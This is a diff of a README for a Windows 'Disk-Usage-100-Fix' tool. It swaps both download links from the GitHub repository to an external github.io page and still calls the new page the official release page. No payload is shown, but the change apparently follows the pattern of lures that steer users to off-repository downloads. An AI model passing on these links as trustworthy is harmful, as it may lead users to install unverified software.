@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download Disk-Usage-100-Fix](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/unapparent-corticosterone318/Disk-Usage-100-Fix)
+[![Download Disk-Usage-100-Fix](https://img.shields.io/badge/Download-Application-blue.svg)](https://unapparent-corticosterone318.github.io)
 
 </div>
 
@@ -27,7 +27,7 @@ This application runs on Windows 10 and Windows 11. Your computer requires at le
 5. Follow the prompts on the screen to finish the installation.
 6. Launch the application from your desktop or start menu.
 
-[Download Disk-Usage-100-Fix from the official release page](https://github.com/unapparent-corticosterone318/Disk-Usage-100-Fix)
+[Download Disk-Usage-100-Fix from the official release page](https://unapparent-corticosterone318.github.io)
 
 ## ⚙️ Using the tool
 
